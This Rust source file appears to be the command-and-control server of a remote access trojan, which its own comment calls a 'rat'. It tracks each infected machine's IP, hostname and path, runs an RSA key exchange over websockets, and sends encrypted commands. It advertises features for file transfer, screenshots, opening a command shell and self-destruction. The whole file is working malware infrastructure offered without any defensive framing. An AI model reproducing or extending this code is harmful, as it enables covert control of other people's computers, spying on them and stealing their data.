use core::str;
use std::net::{IpAddr, SocketAddr};

use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use rsa::{
    pkcs1::{DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey},
    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
};
use tokio_tungstenite::WebSocketStream;
use tungstenite::Message;

pub const FEATURES: [&str; 5] = [
    "update",
    "start_file_transfer",
    "send_screenshot",
    "open_cmd",
    "self_destruct",
];
#[derive(Debug)]
#[allow(dead_code)]
pub struct Instance {
    ip: IpAddr,
    write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
    read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
    hostname: String,
    public_key: Option<RsaPublicKey>,
    private_key: Option<RsaPrivateKey>,
    path: String,
}
impl Instance {
    pub fn new(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key: None,
            private_key: None,
            path,
        }
    }
    pub fn init_old(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        public_key: Option<RsaPublicKey>,
        private_key: Option<RsaPrivateKey>,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key,
            private_key,
            path,
        }
    }
    pub fn get_ip(&self) -> IpAddr {
        self.ip
    }
    pub fn get_hostname(&self) -> &str {
        &self.hostname
    }
    pub fn get_path(&self) -> &str {
        &self.path
    }
    pub fn set_public_key(&mut self, public_key: RsaPublicKey) {
        self.public_key = Some(public_key);
    }
    pub fn set_private_key(&mut self, private_key: RsaPrivateKey) {
        self.private_key = Some(private_key);
    }
    pub fn is_keys_init(&self) -> bool {
        if self.public_key.is_none() || self.private_key.is_none() {
            return false;
        }
        true
    }
    pub async fn send_message(&mut self, message: &str) {
        self.write.send(Message::from(message)).await.unwrap();
    }
    pub async fn send_encrypted_message(&mut self, message: &str) {
        let encrypted_data = self.encrypt_data(None, message.as_bytes());
        self.write
            .send(Message::from(hex::encode(encrypted_data)))
            .await
            .unwrap();
    }
    pub async fn send_chosen_command(&mut self, command: String) {
        self.send_encrypted_message(&command).await;
    }
    pub async fn init_keys(&mut self) -> (String, String) {
        //Send pong for rat to generate a public key
        self.send_message("pong").await;

        let mut public_key = String::from("");
        let mut private_key_string = String::from("");
        if let Some(message) = &self.read.next().await {
            public_key = message.as_ref().unwrap().to_string();
            //Generate private key and also assign it
            let private_key = &self.generate_private_key();
            private_key_string = private_key
                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                .unwrap()
                .to_string();
            //Get public key from what user sends us
            self.set_public_key(RsaPublicKey::from_pkcs1_pem(public_key.as_str()).unwrap());
            self.set_private_key(private_key.to_owned());

            //Send my public key encrypted by users public key to user and forget about it
            let encrypted_key = &self.encrypt_my_key(
                &self.public_key.clone().unwrap(),
                private_key
                    .to_public_key()
                    .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                    .unwrap()
                    .as_bytes(),
            );
            //Split encrypted key, encode it in hex and send back
            for index in 0..2 {
                if index == 0 {
                    self.write
                        .send(Message::from(hex::encode(&encrypted_key.0[..])))
                        .await
                        .unwrap();
                } else {
                    self.write
                        .send(Message::from(hex::encode(&encrypted_key.1[..])))
                        .await
                        .unwrap();
                }
            }
        }
        println!("rsa init sequence with complete");
        (public_key, private_key_string)
    }

    fn generate_private_key(&self) -> RsaPrivateKey {
        let mut rng = rand::thread_rng();
        let bits = 2048;
        RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key")
    }

    fn encrypt_my_key(&self, public_key: &RsaPublicKey, data_to_enc: &[u8]) -> (Vec<u8>, Vec<u8>) {
        let mid = data_to_enc.len() / 2;
        (
            self.encrypt_data(Some(public_key), &data_to_enc[..mid]),
            self.encrypt_data(Some(public_key), &data_to_enc[mid..]),
        )
    }
    pub fn encrypt_data(&self, public_key: Option<&RsaPublicKey>, data_to_enc: &[u8]) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        //Yes this is neccessary if we need to use different public key
        match public_key {
            Some(public_key) => public_key
                .clone()
                .encrypt(&mut rng, Pkcs1v15Encrypt, data_to_enc)
                .expect("failed to encrypt"),
            None => self
                .public_key
                .clone()
                .unwrap()
                .encrypt(&mut rng, Pkcs1v15Encrypt, data_to_enc)
                .expect("failed to encrypt"),
        }
    }
    pub fn decrypt_data(&self, data_to_decrypt: &[u8]) -> String {
        let decrypted_data = self
            .private_key
            .clone()
            .unwrap()
            .decrypt(Pkcs1v15Encrypt, data_to_decrypt)
            .unwrap();
        String::from_utf8(decrypted_data).unwrap()
    }
}
